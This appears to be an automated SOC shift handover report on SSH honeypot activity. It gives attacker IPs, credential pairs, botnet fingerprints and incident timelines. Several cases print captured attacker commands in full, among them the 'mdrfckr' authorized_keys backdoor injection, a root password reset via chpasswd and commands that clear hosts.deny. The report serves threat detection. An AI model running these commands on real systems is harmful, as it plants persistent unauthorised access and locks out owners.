# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-06 |
| **Generated At** | 2026-06-06T06:56:39Z |
| **Shift Time** | 06:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **197** |
| Confirmed Threats | **130** |
| False Positives Filtered | **67** (34.0%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **12** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **181** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **67** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **44** |
| Unique Passwords | **44** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 6 |
| `GET / HTTP/1.1` | 4 |
| `Accept: */*` | 1 |
| `intel` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 10 |
| `3245gs5662d34` | 7 |
| `345gs5662d34` | 6 |
| `` | 4 |
| `Host: 13.235.92.17:23` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 7 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `GET / HTTP/1.1` | `` | 3 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `Accept: */*` | `` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `pippo` | `196.188.116.41` | 2026-06-06T04:08:09 |
| `root` | `3245gs5662d34` | `196.188.116.41` | 2026-06-06T04:08:15 |
| `root` | `user123` | `43.133.137.101` | 2026-06-06T04:10:29 |
| `root` | `3245gs5662d34` | `43.133.137.101` | 2026-06-06T04:10:31 |
| `root` | `lol` | `152.32.187.177` | 2026-06-06T04:26:37 |
| `root` | `3245gs5662d34` | `152.32.187.177` | 2026-06-06T04:26:40 |
| `root` | `aaaa` | `223.221.38.226` | 2026-06-06T05:32:44 |
| `root` | `3245gs5662d34` | `223.221.38.226` | 2026-06-06T05:33:05 |
| `root` | `Ss123456789` | `223.221.38.226` | 2026-06-06T06:24:23 |
| `root` | `0` | `171.244.37.97` | 2026-06-06T06:25:24 |
| `root` | `alaska` | `171.244.37.97` | 2026-06-06T06:29:30 |
| `root` | `3245gs5662d34` | `171.244.37.97` | 2026-06-06T06:29:33 |
| `root` | `Yq123456` | `173.249.52.138` | 2026-06-06T06:39:12 |
| `root` | `3245gs5662d34` | `173.249.52.138` | 2026-06-06T06:39:16 |
| `root` | `@WSX3edc` | `223.221.38.226` | 2026-06-06T06:45:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **197** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 68 | 11 |
| `7216c7c47391...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 68 | 11 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 2 | — |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:QfqG5c03PwLJ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `223.221.38.226`, `171.244.37.97`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.187.177`, `171.244.37.97`, `196.188.116.41`, `173.249.52.138`, `223.221.38.226`, `43.133.137.101`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **23** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 7 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | MEDIUM |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS269079` | SUPERNETMAIS TELECOMUNICAÇÕES LTDA | 1 | MEDIUM |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c38ef0e4dd4f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.116[.]41` |
| **First Seen** | 2026-06-06 04:08 |
| **Last Seen** | 2026-06-06 04:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 04:08:08` | `cowrie.session.connect` |
| `2026-06-06 04:08:08` | `cowrie.client.version` |
| `2026-06-06 04:08:09` | `cowrie.client.kex` |
| `2026-06-06 04:08:09` | `cowrie.login.success` |
| `2026-06-06 04:08:10` | `cowrie.session.params` |
| `2026-06-06 04:08:10` | `cowrie.command.input` |
| `2026-06-06 04:08:10` | `cowrie.command.failed` |
| `2026-06-06 04:08:10` | `cowrie.log.closed` |
| `2026-06-06 04:08:10` | `cowrie.session.params` |
| `2026-06-06 04:08:10` | `cowrie.command.input` |
| `2026-06-06 04:08:10` | `cowrie.session.file_download` |
| `2026-06-06 04:08:10` | `cowrie.log.closed` |
| `2026-06-06 04:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.116[.]41` to AbuseIPDB if not already reported
- [ ] Block `196.188.116[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d594e5c78a

| Field | Detail |
|---|---|
| **Source IP** | `196.188.116[.]41` |
| **First Seen** | 2026-06-06 04:08 |
| **Last Seen** | 2026-06-06 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 04:08:14` | `cowrie.session.connect` |
| `2026-06-06 04:08:14` | `cowrie.client.version` |
| `2026-06-06 04:08:14` | `cowrie.client.kex` |
| `2026-06-06 04:08:15` | `cowrie.login.success` |
| `2026-06-06 04:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.116[.]41` to AbuseIPDB if not already reported
- [ ] Block `196.188.116[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-076499f4bdb7

| Field | Detail |
|---|---|
| **Source IP** | `43.133.137[.]101` |
| **First Seen** | 2026-06-06 04:10 |
| **Last Seen** | 2026-06-06 04:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 04:10:28` | `cowrie.session.connect` |
| `2026-06-06 04:10:28` | `cowrie.client.version` |
| `2026-06-06 04:10:28` | `cowrie.client.kex` |
| `2026-06-06 04:10:29` | `cowrie.login.success` |
| `2026-06-06 04:10:29` | `cowrie.session.params` |
| `2026-06-06 04:10:29` | `cowrie.command.input` |
| `2026-06-06 04:10:29` | `cowrie.command.failed` |
| `2026-06-06 04:10:29` | `cowrie.log.closed` |
| `2026-06-06 04:10:29` | `cowrie.session.params` |
| `2026-06-06 04:10:29` | `cowrie.command.input` |
| `2026-06-06 04:10:29` | `cowrie.session.file_download` |
| `2026-06-06 04:10:29` | `cowrie.log.closed` |
| `2026-06-06 04:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.137[.]101` to AbuseIPDB if not already reported
- [ ] Block `43.133.137[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ecc20b1623

| Field | Detail |
|---|---|
| **Source IP** | `43.133.137[.]101` |
| **First Seen** | 2026-06-06 04:10 |
| **Last Seen** | 2026-06-06 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 04:10:31` | `cowrie.session.connect` |
| `2026-06-06 04:10:31` | `cowrie.client.version` |
| `2026-06-06 04:10:31` | `cowrie.client.kex` |
| `2026-06-06 04:10:31` | `cowrie.login.success` |
| `2026-06-06 04:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.137[.]101` to AbuseIPDB if not already reported
- [ ] Block `43.133.137[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31bb89862ade

| Field | Detail |
|---|---|
| **Source IP** | `152.32.187[.]177` |
| **First Seen** | 2026-06-06 04:26 |
| **Last Seen** | 2026-06-06 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 04:26:37` | `cowrie.session.connect` |
| `2026-06-06 04:26:37` | `cowrie.client.version` |
| `2026-06-06 04:26:37` | `cowrie.client.kex` |
| `2026-06-06 04:26:37` | `cowrie.login.success` |
| `2026-06-06 04:26:38` | `cowrie.session.params` |
| `2026-06-06 04:26:38` | `cowrie.command.input` |
| `2026-06-06 04:26:38` | `cowrie.command.failed` |
| `2026-06-06 04:26:38` | `cowrie.log.closed` |
| `2026-06-06 04:26:38` | `cowrie.session.params` |
| `2026-06-06 04:26:38` | `cowrie.command.input` |
| `2026-06-06 04:26:38` | `cowrie.session.file_download` |
| `2026-06-06 04:26:38` | `cowrie.log.closed` |
| `2026-06-06 04:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.187[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.187[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f96c3ebbc97

| Field | Detail |
|---|---|
| **Source IP** | `152.32.187[.]177` |
| **First Seen** | 2026-06-06 04:26 |
| **Last Seen** | 2026-06-06 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 04:26:40` | `cowrie.session.connect` |
| `2026-06-06 04:26:40` | `cowrie.client.version` |
| `2026-06-06 04:26:40` | `cowrie.client.kex` |
| `2026-06-06 04:26:40` | `cowrie.login.success` |
| `2026-06-06 04:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.187[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.187[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2177f1678e31

| Field | Detail |
|---|---|
| **Source IP** | `223.221.38[.]226` |
| **First Seen** | 2026-06-06 05:32 |
| **Last Seen** | 2026-06-06 05:33 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 05:32:36` | `cowrie.session.connect` |
| `2026-06-06 05:32:36` | `cowrie.client.version` |
| `2026-06-06 05:32:36` | `cowrie.client.kex` |
| `2026-06-06 05:32:44` | `cowrie.login.success` |
| `2026-06-06 05:32:46` | `cowrie.session.params` |
| `2026-06-06 05:32:46` | `cowrie.command.input` |
| `2026-06-06 05:32:46` | `cowrie.command.failed` |
| `2026-06-06 05:32:46` | `cowrie.log.closed` |
| `2026-06-06 05:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.221.38[.]226` to AbuseIPDB if not already reported
- [ ] Block `223.221.38[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd9a2f97158

| Field | Detail |
|---|---|
| **Source IP** | `223.221.38[.]226` |
| **First Seen** | 2026-06-06 05:33 |
| **Last Seen** | 2026-06-06 05:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 05:33:02` | `cowrie.session.connect` |
| `2026-06-06 05:33:03` | `cowrie.client.version` |
| `2026-06-06 05:33:03` | `cowrie.client.kex` |
| `2026-06-06 05:33:05` | `cowrie.login.success` |
| `2026-06-06 05:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.221.38[.]226` to AbuseIPDB if not already reported
- [ ] Block `223.221.38[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432673ce9cd3

| Field | Detail |
|---|---|
| **Source IP** | `223.221.38[.]226` |
| **First Seen** | 2026-06-06 06:24 |
| **Last Seen** | 2026-06-06 06:24 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:24:21` | `cowrie.session.connect` |
| `2026-06-06 06:24:21` | `cowrie.client.version` |
| `2026-06-06 06:24:22` | `cowrie.client.kex` |
| `2026-06-06 06:24:23` | `cowrie.login.success` |
| `2026-06-06 06:24:23` | `cowrie.session.params` |
| `2026-06-06 06:24:23` | `cowrie.command.input` |
| `2026-06-06 06:24:23` | `cowrie.command.failed` |
| `2026-06-06 06:24:25` | `cowrie.log.closed` |
| `2026-06-06 06:24:25` | `cowrie.session.params` |
| `2026-06-06 06:24:25` | `cowrie.command.input` |
| `2026-06-06 06:24:26` | `cowrie.session.file_download` |
| `2026-06-06 06:24:26` | `cowrie.log.closed` |
| `2026-06-06 06:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.221.38[.]226` to AbuseIPDB if not already reported
- [ ] Block `223.221.38[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf701a1cdecb

| Field | Detail |
|---|---|
| **Source IP** | `223.221.38[.]226` |
| **First Seen** | 2026-06-06 06:24 |
| **Last Seen** | 2026-06-06 06:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:24:34` | `cowrie.session.connect` |
| `2026-06-06 06:24:34` | `cowrie.client.version` |
| `2026-06-06 06:24:34` | `cowrie.client.kex` |
| `2026-06-06 06:24:44` | `cowrie.login.success` |
| `2026-06-06 06:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.221.38[.]226` to AbuseIPDB if not already reported
- [ ] Block `223.221.38[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505150119071

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]97` |
| **First Seen** | 2026-06-06 06:25 |
| **Last Seen** | 2026-06-06 06:25 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:QfqG5c03PwLJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:25:23` | `cowrie.session.connect` |
| `2026-06-06 06:25:23` | `cowrie.client.version` |
| `2026-06-06 06:25:23` | `cowrie.client.kex` |
| `2026-06-06 06:25:24` | `cowrie.login.success` |
| `2026-06-06 06:25:24` | `cowrie.session.params` |
| `2026-06-06 06:25:24` | `cowrie.command.input` |
| `2026-06-06 06:25:24` | `cowrie.command.failed` |
| `2026-06-06 06:25:24` | `cowrie.log.closed` |
| `2026-06-06 06:25:24` | `cowrie.session.params` |
| `2026-06-06 06:25:24` | `cowrie.command.input` |
| `2026-06-06 06:25:24` | `cowrie.session.file_download` |
| `2026-06-06 06:25:24` | `cowrie.log.closed` |
| `2026-06-06 06:25:34` | `cowrie.session.params` |
| `2026-06-06 06:25:34` | `cowrie.command.input` |
| `2026-06-06 06:25:34` | `cowrie.log.closed` |
| `2026-06-06 06:25:35` | `cowrie.session.params` |
| `2026-06-06 06:25:35` | `cowrie.command.input` |
| `2026-06-06 06:25:35` | `cowrie.log.closed` |
| `2026-06-06 06:25:35` | `cowrie.session.params` |
| `2026-06-06 06:25:35` | `cowrie.command.input` |
| `2026-06-06 06:25:35` | `cowrie.session.file_download` |
| `2026-06-06 06:25:35` | `cowrie.log.closed` |
| `2026-06-06 06:25:35` | `cowrie.session.params` |
| `2026-06-06 06:25:35` | `cowrie.command.input` |
| `2026-06-06 06:25:36` | `cowrie.log.closed` |
| `2026-06-06 06:25:36` | `cowrie.session.params` |
| `2026-06-06 06:25:36` | `cowrie.command.input` |
| `2026-06-06 06:25:36` | `cowrie.log.closed` |
| `2026-06-06 06:25:36` | `cowrie.session.params` |
| `2026-06-06 06:25:36` | `cowrie.command.input` |
| `2026-06-06 06:25:36` | `cowrie.command.input` |
| `2026-06-06 06:25:36` | `cowrie.log.closed` |
| `2026-06-06 06:25:36` | `cowrie.session.params` |
| `2026-06-06 06:25:36` | `cowrie.command.input` |
| `2026-06-06 06:25:37` | `cowrie.log.closed` |
| `2026-06-06 06:25:37` | `cowrie.session.params` |
| `2026-06-06 06:25:37` | `cowrie.command.input` |
| `2026-06-06 06:25:37` | `cowrie.log.closed` |
| `2026-06-06 06:25:37` | `cowrie.session.params` |
| `2026-06-06 06:25:37` | `cowrie.command.input` |
| `2026-06-06 06:25:37` | `cowrie.log.closed` |
| `2026-06-06 06:25:37` | `cowrie.session.params` |
| `2026-06-06 06:25:37` | `cowrie.command.input` |
| `2026-06-06 06:25:38` | `cowrie.log.closed` |
| `2026-06-06 06:25:38` | `cowrie.session.params` |
| `2026-06-06 06:25:38` | `cowrie.command.input` |
| `2026-06-06 06:25:38` | `cowrie.log.closed` |
| `2026-06-06 06:25:38` | `cowrie.session.params` |
| `2026-06-06 06:25:38` | `cowrie.command.input` |
| `2026-06-06 06:25:38` | `cowrie.log.closed` |
| `2026-06-06 06:25:38` | `cowrie.session.params` |
| `2026-06-06 06:25:38` | `cowrie.command.input` |
| `2026-06-06 06:25:39` | `cowrie.log.closed` |
| `2026-06-06 06:25:39` | `cowrie.session.params` |
| `2026-06-06 06:25:39` | `cowrie.command.input` |
| `2026-06-06 06:25:39` | `cowrie.log.closed` |
| `2026-06-06 06:25:39` | `cowrie.session.params` |
| `2026-06-06 06:25:39` | `cowrie.command.input` |
| `2026-06-06 06:25:39` | `cowrie.log.closed` |
| `2026-06-06 06:25:40` | `cowrie.session.params` |
| `2026-06-06 06:25:40` | `cowrie.command.input` |
| `2026-06-06 06:25:40` | `cowrie.log.closed` |
| `2026-06-06 06:25:40` | `cowrie.session.closed` |

